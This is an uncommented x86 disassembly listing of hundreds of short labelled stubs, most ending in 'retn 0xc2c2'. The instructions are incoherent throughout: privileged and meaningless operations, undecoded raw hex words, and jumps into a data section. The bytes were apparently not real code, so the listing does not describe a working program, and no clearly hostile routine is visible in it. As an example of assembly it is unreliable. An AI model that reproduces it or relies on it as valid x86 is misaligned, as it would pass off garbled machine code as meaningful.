dec edx
fist [ edi ]
scasb [ edi ]
mov ebx 0xadad8bac
retn 0xc2c2
sub_462fb1
retn 0xc2c2
sub_462fd3
push esi
mov eax 0xb0badad
popad
xchg edx eax
adc bh [ ebx + 0x525244f5 ]
retn 0xc2c2
sub_463016
retn 0xc2c2
sub_463019
retn 0xc2c2
sub_46301c
retn 0xc2c2
sub_46301f
retn 0xc2c2
sub_463022
retn 0xc2c2
sub_463025
xor al 0xdb
pop ss
mov edx 0xaf9bbb0a
lodsd [ esi ]
lodsd [ esi ]
retn 0xd7df
sub_463032
test eax 0xad02adad
lds edi [ edx - 0x2eadadae ]
xchg esi eax
push 0xffffffbb
insd
stosb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0x7c2
sub_463048
fnstcw [ esi - 0x5252e345 ]
lodsd [ esi ]
retn 0x34c2
sub_463052
fistp [ edi ]
mov edx 0x4573bb0b
push edx
push edx
retn 0xc2c2
sub_46305e
retn 0x34c2
sub_463061
imul edx [ ebx - 0x45 ] 0xadad89a8
cmp [ 0xffffffff8c17db34 ] bh
or bh [ ebx - 0x52524e4b ]
retn 0xc2c2
sub_463077
retn 0xc2c2
sub_46307a
retn 0x3538
sub_46307d
fst [ eax - 0x79e824cc ]
fst [ ebx - 0x7be824cc ]
or bh [ eax ]
and [ ebx + ebx * 8 ] esi
pop ss
mov cl [ edx ]
cmp [ ecx ] dh
xor al 0xdb
pop ss
mov [ ebx + 0x52525cb5 ] bh
retn 0xc2c2
sub_46309f
retn 0xc2c2
sub_4630a5
push esp
push edx
push edx
retn 0xc2c2
sub_4630ab
retn 0xc2c2
sub_4630ae
retn 0xcbb
sub_4630b1
push ecx
push edx
push edx
retn 0xc2c2
sub_4630b7
pop ebp
xlat
xor al 0xa8
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0x52524e8d
retn 0x5dc2
sub_4630da
retn 0xbed3
sub_4630dd
inc edx
push esi
push edx
push edx
mov ebx 0xadad8138
retn 0xc2c2
sub_4630e9
retn 0xc2c2
sub_4630ec
retn 0xc2c2
sub_4630ef
retn 0xbb02
sub_4630f4
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4630f9
retn 0xc2c2
sub_4630fc
retn 0xc2c2
sub_4630ff
retn 0xc2c2
sub_463102
retn 0x1fd9
sub_463105
scasb [ edi ]
mov ebx 0x525270c5
retn 0xd907
sub_46310e
mov esi 0x5062bed3
push edx
push edx
add [ ebx + 0x52524100 ] edi
retn 0xc2c2
sub_46311e
retn 0xc2c2
sub_46314a
retn 0xc2c2
sub_46314d
retn 0xc2c2
sub_463150
retn 0xdb34
sub_463153
pop es
bound edi [ eax ]
sub ecx [ eax ]
mov ebx 0xadad8005
retn 0xbb02
sub_463161
inc ebx
push edx
push edx
retn 0xc2c2
sub_463167
retn 0xc2c2
sub_46316a
retn 0x59bb
sub_46316d
lea ebp [ ebp - 0x3d3d3d53 ]
retn 0xdfc2
sub_46319d
loope r-xdata
int 0xb3
lodsd [ esi ]
lodsd [ esi ]
or edi [ ebx - 0x5252700b ]
retn 0xc2c2
push edx
push edx
retn 0x5dc2
sub_4631a4
xlat
pop ebp
push edx
push edx
popad
xchg edx eax
xchg ecx eax
retn 0xc2c2
sub_4631af
retn 0x2c2
sub_4631b2
mov ebx 0xadad843c
retn 0xc2c2
sub_4631ba
retn 0xc2c2
sub_4631bd
retn 0xdfc2
sub_4631c1
mov [ 0xffffffffbaadada9 ] al
mov ebp [ ebp + ebp * 4 + 0x498aa5ad ]
xchg edx eax
adc bl [ ebx - 0x44ed3d6f ]
aas
test [ ebp - 0x3d3d3d53 ] ch
retn 0x37d1
sub_4631de
scasb [ edi ]
push edx
add al 0xd9
mov [ 0x2ae17df ] al
lodsd [ esi ]
daa
pop edx
mov edx 0xadadb3cd
or edi [ ebx - 0x5252700b ]
retn 0xc2c2
sub_4631f8
retn 0xc2c2
sub_4631fb
mov ebx 0x52525d7d
retn 0xc2c2
sub_463203
retn 0x3801
sub_463206
push esi
fist [ esi ]
add bl cl
pop ss
stosb [ edi ]
mov ebx 0xadadbdb1
retn 0xc2c2
sub_463216
retn 0x17db
sub_463219
scasb [ edi ]
popad
mov edi ebx
pop ss
rol [ ecx ] cl
add bh [ edx + 0x52525755 ]
rcl [ esi - 0x591444a2 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463231
retn 0xc2c2
sub_463234
retn 0x505
sub_463237
add ebx ebx
das
scasb [ edi ]
lodsd [ esi ]
add al 0x3e
add eax 0xdf422fd9
pop ss
scasb [ edi ]
add al [ 0xffffffffadb5adbb ]
lodsd [ esi ]
retn 0xc2c2
sub_46324f
retn 0xc2c2
sub_463252
retn 0xc2c2
sub_463255
retn 0xad04
sub_463258
add eax 0xaf56bb1e
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463262
retn 0xc2c2
sub_463265
retn 0xc2c2
sub_463268
retn 0xc2c2
sub_46326b
or al 0x91
retn 0xc2c2
sub_463270
retn 0xc2c2
sub_463273
retn 0xd9c2
sub_46329c
mov edx 0x52525ac5
mov ebx 0xadad8925
mov edx 0x5252423a
fist [ esi ]
mov ebx 0xadad8e2a
retn 0xc2c2
sub_4632b6
retn 0xc2c2
sub_4632b9
retn 0xc2c2
sub_4632bc
add bh [ ebx - 0x52524554 ]
retn 0xc2c2
sub_4632c5
retn 0xc2c2
sub_4632c8
retn 0xc2c2
sub_4632cb
retn 0xc2c2
sub_4632ce
imul edx [ edi ] 0x82d65daa
pop ebp
push edx
push edx
mov ebx 0x52524d02
retn 0x5dc2
sub_4632df
xlat
sub [ ebx - 0x6d9e5253 ] esp
mov ebx 0xadadb3c1
retn 0xc2c2
sub_4632ee
retn 0xc2c2
sub_4632f1
retn 0xc2c2
sub_4632f4
retn 0xc2c2
sub_4632f7
retn 0xac2
sub_4632fa
cmp [ ebx ] bh
xor al 0xdb
pop ss
mov esi 0xada9cdbb
lodsd [ esi ]
retn 0xc2c2
sub_463308
retn 0xc2c2
sub_46330b
retn 0x1795
sub_463314
pop ss
scasb [ edi ]
push edx
lodsd [ esi ]
add ch [ edx ]
mov ebx 0xadadb6cc
retn 0xc2c2
sub_463325
retn 0xc2c2
sub_463328
retn 0x34c2
sub_46332b
xlat
fwait
mov ebx 0xadad8b01
retn 0xc2c2
sub_463335
xor al 0xdb
pop ds
cmpsb [ esi ] [ edi ]
or edi [ eax ]
sub bh [ ebx - 0x52524024 ]
retn 0xc2c2
sub_463344
rcl [ esi + 0x6216df5e ] 0x1
dec edx
cmp bl [ edx + 0x50 ]
push edx
push edx
fist [ edi ]
sbb bh 0xd7
shr [ edi + 0x59bbadad ] cl
mov ebx 0xc2c2adad
retn 0xc2c2
sub_463363
pop es
fnstcw [ esi - 0x26b9412f ]
aam 0xa2
push edx
push edx
push edx
mov ebx 0xadad8b74
retn 0xc2c2
sub_463377
retn 0xc2c2
sub_46337a
retn 0x14db
sub_46337d
bound edi [ edx + 0x52525dc2 ]
cmp dl bl
sub [ edi + 0x71 ] ebp
add eax 0xba2e14db
rcr [ ebp + 0x52 ] 0x1
push edx
cmp bl [ 0x55f2ca9 ]
fist [ esi + edi * 2 ]
mov edx 0x52525d26
cmp dh [ edx + 0x564736f ]
fcmovnbe st4
0xba525252 0x5d31
sub_4633c1
pop ebx
mov al [ 0xffffffffbe85bb05 ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4633cc
retn 0xc2c2
sub_4633cf
retn 0xc2c2
sub_4633d2
retn 0xdb34
sub_4633fe
out 0xd9 al
mov dh [ ebx + ebx * 8 ]
pop ss
xor [ ebx + ebx * 8 ] 0x1f
0x92619ad9 0x8fbb
mov [ ebp + 0x3bed9ad ] ch
add edi [ ebx - 0x525241b5 ]
retn 0xc2c2
sub_46341e
retn 0xaba5
sub_463474
retn 0xc2c2
sub_46348b
or eax 0x38082a38
adc eax 0xc807db34
mov ebx 0xadadba32
retn 0xc2c2
sub_46349d
retn 0xd1c2
sub_4634be
add eax 0x5513805
cmp [ ebx - 0x45 ] dl
int1
pop eax
push edx
push edx
retn 0x5dc2
sub_4634cd
salc
xor [ ebp + 0x52 ] eax
push edx
mov ebx 0xadad8bd6
add al 0xd9
mov [ 0x52497fbb ] eax
push edx
retn 0x5c2
sub_463568
push edx
push edx
push edx
cmp dl [ edx + 0x53 ]
push edx
push edx
cmp [ edx + 0x4 ] dl
mov edx 0x525253e7
mov ebx 0xadad85d7
retn 0xc2c2
sub_463580
retn 0xc2c2
sub_463583
retn 0xc2c2
sub_463586
retn 0x3ac2
sub_463614
retn 0x402
sub_463617
lodsd [ esi ]
add eax 0x9b0c0d02
xchg ecx eax
fnstcw [ esi + 0x61123803 ]
xchg edx eax
mov ebx 0x52525e0f
retn 0xc2c2
sub_46362d
retn 0xc2c2
sub_463630
retn 0xc2c2
sub_463691
retn 0xd75d
sub_463694
retn
sub_463695
pop eax
push edx
push edx
mov ebx 0x5252470e
retn 0xdb34
sub_46372e
popad
pop edx
push edx
push edx
retn 0xc2c2
sub_463735
retn 0xc2c2
sub_463738
retn 0xc2c2
sub_46375a
retn 0x5dc2
sub_46375d
salc
inc edi
mov esi 0x41bbadad
dec ecx
push edx
push edx
retn 0x360b
sub_46376a
fst [ ebx - 0x45 ]
movsb [ edi ] [ esi ]
pop edi
push edx
push edx
retn 0xc2c2
sub_463774
retn 0xc2c2
sub_463777
retn 0x9bb
sub_46377a
mov eax [ 0xffffffffc2c2adad ]
retn 0xc2c2
sub_463782
popad
xchg edx eax
or al 0xbb
xchg esp eax
movsd [ edi ] [ esi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_46378d
add [ ebx - 0x525270c8 ] edi
retn 0xc2c2
sub_463796
retn 0xdb34
sub_4637c0
retn 0xc2c2
sub_4637c3
add bh [ edx + 0x52525918 ]
or ecx [ ebx ]
fistp [ edi ]
mov al [ ebx ]
cmp [ edx ] dl
lodsd [ esi ]
and al 0x2
fisttp [ edi ]
mov bh [ ebx - 0x52527eca ]
retn 0xc2c2
sub_4637df
retn 0xc2c2
sub_4637e2
add eax 0xada81fbb
lodsd [ esi ]
retn 0xc2c2
sub_4637eb
retn 0xc2c2
sub_4637ee
retn 0xd1c2
sub_4637f1
mov esi 0xa617df5e
add bl cl
pop ss
pop edx
mov ebx 0x52527212
retn 0xc2c2
sub_463802
retn 0xc2c2
sub_463805
retn 0xc2c2
sub_463808
retn 0xc2c2
sub_46380b
add [ ebp - 0x3a524dd9 ] ebp
0x5252
sub_463814
push edx
imul ecx [ edi ] 0x5e
mov ebx 0xadada06a
retn 0xc2c2
sub_463820
retn 0xc2c2
sub_463823
retn 0xc2c2
sub_463826
retn 0xd7c2
sub_463829
xchg edx eax
pop ebp
salc
add al 0x5c
push edx
push edx
mov ebx 0xadadac8a
retn 0xc2c2
sub_463838
retn 0xc2c2
sub_46383b
retn 0xc2c2
sub_46383e
retn 0xc2c2
sub_463841
retn 0xc2c2
sub_463844
retn 0xc2c2
sub_463847
or bh [ eax ]
and [ ebx + ebx * 8 ] dh
pop ss
mov eax 0xada8f4bb
lodsd [ esi ]
retn 0xc2c2
sub_463856
retn 0xc2c2
sub_463859
mov ebx 0xadad85b8
retn 0xc2c2
sub_463861
retn 0xc2c2
sub_463864
retn 0xbac2
sub_463867
push esp
pushfd
lodsd [ esi ]
lodsd [ esi ]
rcl [ esi - 0x446d28b6 ] 0x1
add eax 0xc2adadae
mov ebx 0xadad9e45
retn 0xc2c2
sub_46387e
retn 0xdb34
sub_463881
pop es
xor cl [ eax ]
cmp [ eax ] dh
xor al 0xdb
pop es
xor [ ebx + 0x52525b41 ] bh
retn 0xc2c2
sub_463892
retn 0xc2c2
sub_463895
retn 0xc2c2
sub_463898
retn 0x17db
sub_46389b
scasb [ edi ]
fst [ edi ]
scasb [ edi ]
mov ebx 0xadadae5b
retn 0xbbc2
sub_4638a7
insd
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_4638ae
retn 0x2c2
sub_4638b1
add [ ebp - 0x1824b9fb ] ebp
sub [ edi - 0x6d285253 ] 0x5d
xlat
push ecx
movsb [ edi ] [ esi ]
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0x525256dd
retn 0xdfdf
sub_4638cb
mov [ 0xffffffffbaadada9 ] al
cmp [ esi - 0x4445253 ] bl
inc ecx
push edx
push edx
xlat
xchg edx eax
mov ebx 0xadada677
retn 0xc2c2
sub_4638e3
shr [ ecx + 0x5ad55d5b ] 0x1
mov edi 0x39bbadad
mov eax 0xc2c2adad
retn 0x38c2
sub_463907
retn 0xc2c2
sub_46390a
retn 0x96d1
sub_46390d
inc esi
xlat
xchg edx eax
pop ebp
salc
and ebx [ ecx + 0x24adadad ]
push es
mov ebx 0xadadb53d
retn 0xbb02
sub_463923
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463928
retn 0x17df
sub_46392b
mov esi 0x94010102
pop ss
mov esi 0xa31795ea
cmp [ edx + 0x38 ] dl
push edx
xchg ebp eax
pop ss
cmpsd [ esi ] [ edi ]
cmp [ edx + 0x38 ] dl
push edx
mov ebx 0xadad9c40
retn 0xc2c2
sub_463949
add [ eax ] edi
push ebp
add [ ebp + 0x5252b2c5 ] ebp
push edx
mov ebx 0xadadbb50
adc bh [ ebx + 0x5252597e ]
retn 0xc2c2
sub_463961
retn 0xc2c2
sub_463964
retn 0xc2c2
sub_463967
retn 0xd1c2
sub_46396a
xchg ebx eax
mov [ 0xffffffffada934ba ] al
lodsd [ esi ]
fst [ ecx ]
mov bx 0x567b
push edx
push edx
retn 0xc2c2
sub_46397c
retn 0xc2c2
sub_46397f
retn 0xc2c2
sub_463982
retn 0xc2c2
sub_463985
retn 0xd65d
sub_4639cb
retn 0xc2c2
sub_4639ce
retn 0xc2c2
sub_4639d1
pop ebp
xlat
int1
mov eax 0x9261adad
mov ebx 0xadad9974
retn 0xc2c2
sub_463a2a
sar [ esi + 0x525250da ] cl
jmp sub_463a51
sub_463a3d
retn 0x523a
sub_463a51
push edx
xlat
xchg edx eax
pop ebp
xlat
and eax 0xdfadadb2
pop ss
mov [ edx ] 0xbb
dec ecx
sub [ ebp - 0x3d3d3d53 ] 0xc2c2c2c2
retn 0xc2c2
sub_463a6d
retn 0xc2c2
sub_463a70
retn 0xc2c2
sub_463a73
retn 0xc2c2
sub_463a76
retn 0xc2c2
sub_463a79
retn 0xc2c2
sub_463a7d
mov [ ebx + ebx * 8 ] dh
psadbw mmx1 [ ecx ]
cmp [ esi ] ah
xor al 0xdb
pmuludq mmx1 [ ecx ]
cmp [ ecx ] ah
mov ebx 0xadad9a39
retn 0x9bc2
sub_463a94
xchg ecx eax
retn 0xc2c2
sub_463a98
retn 0xc2c2
sub_463a9b
retn 0x92d7
sub_463ac2
mov ebx 0xadadbbe9
retn 0xc2c2
sub_463aca
retn 0xc2c2
sub_463acd
retn 0xc2c2
sub_463ad0
retn 0xc2c2
sub_463ad3
retn 0xc2c2
sub_463ad6
retn 0xc2c2
sub_463ad9
retn 0xc2c2
sub_463adc
retn 0xadc2
sub_463ae0
0xbb525252 0xb7d1
sub_463ae7
lodsd [ esi ]
lodsd [ esi ]
mov edx 0x52524e92
mov ebx 0xadadb57b
retn 0xc2c2
sub_463af6
retn 0x2138
sub_463af9
mov ebx 0xadadaa87
retn 0xc2c2
sub_463b01
retn 0xc2c2
sub_463b04
retn 0xc2c2
sub_463b07
retn 0xc2c2
sub_463b0a
fldcw [ ebx - 0x527df745 ]
lodsd [ esi ]
xor al 0xdb
pop ss
mov ah 0xa
mov ebx 0xadad9f22
retn 0xd1c2
sub_463b1f
pushad
pop ebp
xlat
xor bl [ ecx + 0x52 ]
push edx
fstp [ edx ]
pop edx
mov ebx 0x5252524d
retn 0xc2c2
sub_463b31
retn 0xc2c2
sub_463b34
retn 0xc2c2
sub_463b37
retn 0xe55d
sub_463b3a
inc ebx
add [ ecx + ebx * 8 ] eax
xchg ebx eax
xor al 0xd7
sbb [ ebp - 0x2a ] 0x3b
mov cl 0xad
lodsd [ esi ]
mov ebx 0x52525419
fst [ ebp - 0x5260d245 ]
lodsd [ esi ]
retn 0x4c2
sub_463b57
mov ebx 0xadada013
retn 0x5dc2
sub_463b95
retn 0xc2c2
sub_463b98
retn 0xadc2
sub_463b9b
vrsqrtss xmm2 xmm5 [ edx + 0x52 ]
mov ebx 0xadadb6fb
retn 0xc2c2
sub_463ba8
retn 0x38c2
sub_463bf1
retn 0xc2c2
sub_463bf4
retn 0xc2c2
sub_463bf7
retn 0xc2c2
sub_463bfa
retn 0xc2c2
sub_463bfd
retn 0xc2c2
sub_463c68
retn 0xc2c2
sub_463c6b
retn 0x34c2
sub_463ca9
retn 0xc2c2
sub_463cac
mov ebx 0xadadb436
retn 0xc2c2
sub_463cb4
retn 0x38c2
sub_463cb7
push 0xbb08380a
mov bl 0x81
lodsd [ esi ]
lodsd [ esi ]
retn 0xad03
sub_463cc3
and ch [ esi - 0x5243e845 ]
lodsd [ esi ]
retn 0xc2c2
sub_463ccd
retn 0x5c2
sub_463d21
scasb [ edi ]
add ch [ ebp + 0x59ba5e27 ]
cwde
lodsd [ esi ]
lodsd [ esi ]
rcl [ esi + 0x4303bb5e ] 0x1
push edx
push edx
retn 0xc2c2
sub_463d36
retn 0xc2c2
sub_463d39
retn 0xc2c2
sub_463d3c
retn 0xc2c2
sub_463d40
retn 0xc2c2
sub_463d42
retn 0xc2c2
sub_463d48
mov ebx 0x52524392
retn 0xc2c2
sub_463d64
retn 0xc2c2
sub_463d67
retn 0xc2c2
sub_463d6a
add [ ecx ] eax
fstp st7
sub ch [ edi + 0x102adad ]
mov ebx 0x52525a18
retn 0x5138
sub_463d82
in eax 0x96
push edx
push edx
push edx
mov ebx 0xadada888
retn 0xc2c2
sub_463d8f
retn 0xc2c2
sub_463d92
retn 0xc2c2
sub_463d95
retn 0xbed3
sub_463d9a
push edx
push edx
mov ebx 0xadadad47
retn 0xd70b
sub_463def
retn 0xc2c2
sub_463df2
retn 0xc2c2
sub_463df5
retn 0xd7df
sub_463e1b
retn 0xc2c2
sub_463e1e
retn 0x26ad
sub_463e23
cmp [ edx - 0x45 ] dl
pop es
mov bl 0xad
lodsd [ esi ]
fstp st7
out dx al
test al 0xad
lodsd [ esi ]
add bh [ ebx - 0x52524cdb ]
retn 0xc2c2
sub_463e39
retn 0xc2c2
sub_463e3c
retn 0x61c2
sub_463e40
mov ebx 0xadadb7b0
retn 0xc2c2
sub_463e48
retn 0xc2c2
sub_463e4b
retn 0xc2c2
sub_463e4e
retn 0xdb34
sub_463e5a
or [ eax ] bh
xor al 0xdb
pop es
mov [ eax ] cs
cmp [ edi ] dh
mov ebx 0xadad91dc
retn 0xc2c2
sub_463e6c
retn 0xc2c2
sub_463e6f
retn 0xa9d1
sub_463e72
lodsd [ esi ]
pop ebp
xlat
cmp ebp [ ebx - 0x6d9e5253 ]
mov ebx 0xadad898c
retn 0xc2c2
sub_463e83
retn 0xc2c2
sub_463e86
retn 0xc2c2
sub_463e89
retn 0xdb34
sub_463e9b
push edx
push edx
push edx
mov ebx 0x525250ec
retn 0xc2c2
sub_463ea6
retn 0x7c2
sub_463ed0
0xbb525252 0xa852
sub_463ed7
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463edc
retn 0xc2c2
sub_463edf
pop ebp
salc
hlt
sub_463eed
retn 0x3a38
sub_463ef0
or eax 0xbe2fdb34
cmp [ 0xffffffffba2bbb0d ] dh
lodsd [ esi ]
lodsd [ esi ]
retn 0xdb34
sub_463f00
pop ss
dec esi
fst [ eax + 0x4c17db34 ]
or bh [ ebx - 0x52527b0b ]
pop ebp
xlat
outsb
mov cl 0xad
lodsd [ esi ]
mov ebx 0xadadb759
retn 0xc2c2
sub_463f1c
retn 0xc2c2
sub_463f1f
retn 0xdb34
sub_463f22
pop ss
stosb [ edi ]
fist [ edi ]
salc
add al 0x2
mov ebx 0x52524360
retn 0xc2c2
sub_463f31
retn 0xc2c2
sub_463f34
mov ebx 0xadadb015
retn 0xc2c2
sub_463f3c
retn 0x34c2
sub_463f3f
imul ebx [ ebp - 0x52732845 ] 0xaad1c2ad
lodsd [ esi ]
pop ebp
xlat
nop
mov bh 0xad
lodsd [ esi ]
cmp [ ebx - 0x45 ] dl
push 0xc2adadbb
retn 0xc2c2
sub_463f5b
retn 0xc2c2
sub_463f5e
retn 0xc2c2
sub_463f61
retn 0xc2c2
sub_463f64
retn 0xbb07
sub_463f67
mov bl 0x41
push edx
push edx
retn 0x3ac2
sub_463f6e
push edx
push edx
push edx
shr [ ebp + 0x2fdb5a27 ] cl
stosb [ edi ]
mov ebx 0x52525248
retn 0xc2c2
sub_463f80
retn 0xc2c2
sub_463f83
fst [ ebx - 0x71e824cc ]
or bh [ eax ]
jl r-xdata
mov ebx 0xadadb06f
retn 0xc2c2
sub_463f95
retn 0xadc2
sub_463f9b
mov dl cl
test eax 0xa168bbad
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_463fa7
retn 0xdbc2
sub_463faa
clflush [ edx - 0x52525ad2 ]
mov ebx 0x525245cf
retn 0xdb34
sub_463fea
retn 0xbed9
sub_463fed
shr [ edi ] 0x1
pop esi
push edx
mov ebx 0xadad8247
retn 0x63ba
sub_46401a
retn 0xc2c2
sub_46401d
retn 0xc2c2
sub_464020
add eax [ ecx ]
add al 0x5
mov edx 0xadad8bd6
xlat
xchg edx eax
mov ebx 0x52525f95
retn 0xc2c2
sub_464033
retn 0xadc2
sub_46405c
fst [ edi ]
pop edx
mov ebx 0xadadab94
retn 0xc2c2
sub_46407f
xlat
xchg edx eax
pop ebp
salc
iretd
sub_464084
sub [ ebp - 0x15e02053 ] 0xad8723bb
lodsd [ esi ]
retn 0x1fdb
sub_464093
mov ebx 0xadad97d5
retn 0xc2c2
sub_46409b
retn 0xc2c2
sub_46409e
retn 0xc2c2
sub_4640a1
retn 0xc2c2
sub_4640a4
retn 0xc2c2
sub_4640ba
xor al 0xdb
pop ss
cmpsb [ esi ] [ edi ]
or bh [ ebx - 0x52524139 ]
retn 0xc2c2
sub_4640c7
retn 0xc2c2
sub_4640ca
retn 0xc2c2
sub_4640cd
retn 0xc2c2
sub_4640d0
retn 0xc2c2
sub_4640d3
retn 0xc2c2
sub_4640d6
retn 0xc2c2
sub_4640d9
retn 0xc2c2
sub_4640dc
retn 0xc2c2
sub_4640df
retn 0xc2c2
sub_4640e2
retn 0x2ad
sub_4640e5
push ds
mov ebx 0xadadb39f
retn 0xc2c2
sub_4640ee
retn 0x61c2
sub_4640f1
xchg edx eax
or eax 0xad987bbb
lodsd [ esi ]
retn 0xc2c2
sub_4640fb
retn 0xdfc2
sub_4640fe
das
0xafe2dfdf 0xadad
mov edx 0xadada87f
mov ebx 0xadad862d
retn 0xc5ad
sub_464113
cmpsb [ esi ] [ edi ]
push edx
push edx
push edx
or eax 0x919b090c
retn 0xd134
sub_46411f
imul edx [ edx - 0x27 ] 0xffffff93
pop ebp
salc
cmp eax 0xbbadada7
sub eax 0xc2525253
cmp [ edi ] dh
mov ebx 0x52525308
retn 0xc2c2
sub_464139
retn 0xc2c2
sub_46413c
retn 0xc2c2
sub_46413f
retn 0xadc2
sub_464142
pop ss
stosb [ edi ]
rcl [ edi ] 0x1
scasb [ edi ]
jpe r-xdata
adc [ ebx + ebx * 8 ] dh
pop es
0x7bbb
or ebp [ ebx + 0x17 ]
stosb [ edi ]
mov ebx 0xadad8c53
or eax 0xdb341038
sub_46415b
mov eax [ 0xffffffffc2c2adad ]
retn 0x105
sub_464181
in eax 0x62
rcl [ ebx - 0x5b28cbb0 ] 0x1
mov ebx 0xadad8f4f
retn 0xc2c2
sub_464191
retn 0xc2c2
sub_464194
retn 0xc2c2
sub_464197
retn 0xe55d
sub_4641c2
retn 0xc2c2
sub_4641c5
retn 0xc2c2
sub_4641c8
retn 0xdc2
sub_4641cb
or al 0x9
fwait
xchg ecx eax
retn 0xc2c2
sub_4641d2
retn 0x5038
sub_4641d5
cmp cl [ edi + edi - 0x1a520e7b ]
sahf
push edx
push edx
push edx
mov edx 0xadad96de
rcl [ esi - 0x5b9644ba ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0x92d7
sub_4641f3
cwde
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0x52525b65
retn 0x27ad
sub_4641fe
cmpsb [ esi ] [ edi ]
mov ebx 0xadad82bf
retn 0xc2c2
sub_464207
retn 0x17df
sub_46420a
xchg edx eax
popad
fwait
add al 0x2
mov ebx 0xadad9f85
retn 0x7c2
sub_46423c
lodsd [ esi ]
lodsd [ esi ]
fstp st7
mov [ 0xffffffffbaadada9 ] al
les eax [ edx + 0x1fd9adad ]
pop edx
mov ebx 0xadada074
retn 0xc2c2
sub_464256
salc
push edx
push edx
push edx
mov edx 0x525252e6
cmp bl [ edi + 0x594269e ]
mov ebx 0xadadbbc6
retn 0xc2c2
sub_46426d
retn 0xc2c2
sub_464270
retn 0xc2c2
sub_464273
retn 0xc2c2
sub_464276
retn 0xc2c2
sub_464279
retn 0xc2c2
sub_46427c
retn 0xc2c2
sub_46427f
retn 0xc2c2
sub_464282
retn 0xc2c2
sub_464285
retn 0x2c2
sub_4642a8
fcomp [ edi + 0x52 ]
push edx
retn 0x92d1
sub_4642ca
mov ebx 0xadad85c8
retn 0x102
sub_4642d2
lodsd [ esi ]
add eax 0x5d92d71e
salc
push edx
stosd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
cmp [ esi ] dl
fist [ edi ]
cli
add [ ebx + 0x52525957 ] edi
retn 0xc2c2
sub_4642eb
retn 0xc2c2
sub_4642ee
retn 0xc2c2
sub_4642f1
retn 0xd75d
sub_4642f4
mov esi 0x3aadadaa
push esi
push ebx
push edx
push edx
mov ebx 0x525253ab
add eax 0x31be1795
cmp eax 0x97bb2b22
push esi
push edx
push edx
retn 0xc2c2
sub_464312
retn 0xd907
sub_464315
mov esi 0x1fd90303
pop edx
add [ eax - 0x50446429 ] eax
push ebx
push edx
push edx
retn 0xc2c2
sub_464328
retn 0xfbb
sub_46432b
0xc2c2adad 0xc2c2
retn 0xc2c2
sub_464335
add eax 0xba2614db
xchg [ ebp - 0x4cc55253 ] ebp
push eax
xchg ebp eax
jecxz r-xdata
retn 0xd1c2
mov ebx 0xadad81d4
sub_46434c
xchg esi eax
pop esi
cmp [ edx - 0x45 ] al
scasd [ edi ]
push edx
push edx
push edx
retn 0xc2c2
sub_464358
retn 0xc2c2
sub_46435b
retn 0xc2c2
sub_46435e
retn 0xc2c2
sub_464361
retn 0x4d3a
sub_464364
push edx
pop ebp
push edx
lodsd [ esi ]
daa
pop esi
lodsd [ esi ]
retn 0x52f2
sub_46436e
push edx
push edx
mov ebx 0xadada89b
retn 0xd65d
sub_464413
retn 0xad02
sub_464416
daa
mov dh 0xbb
mov eax 0xc2525241
retn 0xd7df
sub_4644c4
retn 0xc2c2
sub_4644c6
retn 0xc2c2
sub_4644c9
retn 0xc2c2
sub_4644cc
retn 0xc2c2
sub_4644cf
retn 0xc2c2
sub_4644d2
retn 0x34c2
sub_4644d5
fld [ edi ]
xchg esp eax
fldcw [ ebx + edi * 4 + 0x5252405b ]
retn 0xc2c2
sub_4644e2
cmp [ 0x3422380a ] bh
fist [ esi ]
jbe r-xdata
add ch [ ebp - 0x464449d9 ]
sub [ ebp - 0x6ef03d53 ] 0xc2
shr [ edx ] cl
push eax
push edx
mov ebx 0xadad8d60
retn 0xc2c2
or bh [ ebx - 0x525240a5 ]
retn 0xc2c2
sub_4644f5
retn 0xc2c2
sub_4644f8
retn 0xc2c2
sub_4644fb
fstp st7
[ edi ]
lodsd [ esi ]
lodsd [ esi ]
mov ebx 0xadadaf98
retn 0xc2c2
sub_464509
rcl [ ebx - 0x61ab44b0 ] 0x1
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_464514
retn 0x1fdb
sub_464517
scasb [ edi ]
mov ebx 0xadadb9bb
retn 0xc2c2
sub_464520
retn 0x5dc2
sub_464573
retn 0x2138
sub_464576
or dh [ ebx + ebx * 8 ]
pop ss
test al 0x61
xchg edx eax
mov ebx 0x52524226
retn 0xdb34
sub_464585
pop ss
stosb [ edi ]
mov ebx 0xadadadba
retn 0xd75d
sub_46458f
outsb
inc eax
push edx
push edx
mov ebx 0x52524314
retn 0xc2c2
sub_46459b
retn 0xc2c2
sub_46459e
retn 0x93d1
sub_4645a1
push eax
rcl [ eax - 0x6d28cbb0 ] 0x1
mov ebx 0xadada3fd
retn 0xc2c2
sub_4645b0
pop es
mov ebx 0xadada8f6
retn 0xc2c2
sub_4645b9
fst [ edi ]
scasb [ edi ]
fwait
xchg ecx eax
retn 0xc2c2
sub_4645c1
retn 0xadc2
sub_4645d8
xlat
xchg edx eax
mov ebx 0xadadaf41
retn 0xc2c2
sub_4645e2
retn 0xc2c2
sub_4645e5
retn 0x3ac2
sub_464646
retn 0x1fdf
sub_464649
scasb [ edi ]
add ebp [ ebp + 0x2fdba627 ]
scasb [ edi ]
mov ebx 0xadadef2c
retn 0xc2c2
sub_464659
retn 0x1adf
sub_464674
rcl [ ebx + 0x5d59bb50 ] 0x1
push edx
push edx
mov ebx 0x52525203
retn 0xc2c2
sub_464684
retn 0x61c2
sub_4646b0
retn 0x9bc2
sub_4646b3
xchg ecx eax
retn 0xc2c2
sub_4646b7
retn 0xc2c2
sub_4646ba
retn 0xc2c2
sub_4646bd
retn 0xc2c2
sub_4646c0
retn 0x1ac2
sub_4646c3
pop ebp
in eax 0x82
mov ebx 0xadad9c07
retn 0xc2c2
sub_4646ce
retn 0xc2c2
sub_4646d1
retn 0xc4ad
